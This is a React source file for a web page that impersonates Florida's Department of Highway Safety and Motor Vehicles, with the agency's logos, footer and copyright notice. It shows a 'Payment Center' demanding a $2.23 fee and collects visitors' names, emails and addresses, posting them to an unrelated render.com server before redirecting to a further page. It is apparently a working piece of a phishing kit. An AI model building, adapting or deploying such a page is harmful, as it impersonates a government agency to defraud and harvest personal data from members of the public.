import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./style.css";

export default function FLHSMVPage() {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    state: "",
    message: "",
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const res = await fetch("https://flhsmv-backend.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (!res.ok) {
        throw new Error(`Server error: ${res.statusText}`);
      }

      navigate("/home1");
    } catch (error) {
      alert("Submission failed: " + error.message);
      console.error("Submission failed:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-wrapper">
      {/* Alert Banner */}
      <nav className="container alert-banner" id="orange">
        <strong>Alert!</strong>
      </nav>

      {/* Header Section */}
      <header className="site-header">
        <div className="top-bar">
          <img src="flhsmv.png" id="flhsmv" alt="FLHSMV logo" />
        </div>
        <nav className="main-nav">
          <button className="menu-toggle" aria-label="Toggle navigation menu">
            <span className="menu-icon">&#9776;</span>
            <strong>Menu</strong>
          </button>
          <ul className="dropdown-menu"></ul>
        </nav>
      </header>

      {/* Payment Form Section */}
      <main>
        <section className="email-form">
          <h2>Payment Center</h2>
          <p className="fee-display">Fee Payment: <strong>$2.23</strong></p>

          <form onSubmit={handleSubmit}>
            <label htmlFor="name">Full Name</label>
            <input
              type="text"
              id="name"
              name="name"
              required
              value={formData.name}
              onChange={handleChange}
            />

            <label htmlFor="email">Email</label>
            <input
              type="email"
              id="email"
              name="email"
              required
              value={formData.email}
              onChange={handleChange}
            />

            <label htmlFor="phone">City</label>
            <input
              type="text"
              id="phone"
              name="phone"
              value={formData.phone}
              onChange={handleChange}
            />

            <label htmlFor="state">State/Province/Region</label>
            <input
              type="text"
              id="state"
              name="state"
              value={formData.state}
              onChange={handleChange}
            />

            <label htmlFor="message">ZIP / Postal Code</label>
            <input
              type="tel"
              id="message"
              name="message"
              required
              value={formData.message}
              onChange={handleChange}
            />

            <button type="submit" disabled={loading}>
              {loading ? "Processing..." : "Submit"}
            </button>
          </form>
        </section>
      </main>

      {/* Footer Section */}
      <footer id="footer">
        <div className="overflow">
          <img src="flhsmv2.png" id="flhsmv2" alt="FLHSMV Secondary Logo" />

          <ul id="footer-navigation" className="list-unstyled">
            <li><a href="/privacy-statement/">Privacy Statement</a></li>
            <li><a href="/email-notice/">Email Notice</a></li>
            <li className="active"><a href="/disclaimer/">Disclaimer</a></li>
            <li className="myflorida">
              <a
                href="http://www.myflorida.com"
                target="_blank"
                rel="noopener noreferrer"
              >
                MyFlorida.com
              </a>
            </li>
            <li><a href="/ada-notice/">ADA Notice</a></li>
            <li>
              <a
                href="https://www.flhsmv.gov/contact-us/?utm_source=internal&utm_medium=none&utm_campaign=Footer&utm_content=contactus"
              >
                Contact Us
              </a>
            </li>
          </ul>

          <p className="copy">
            © 2014 – {new Date().getFullYear()} Florida Department of Highway
            Safety and Motor Vehicles. All Rights Reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
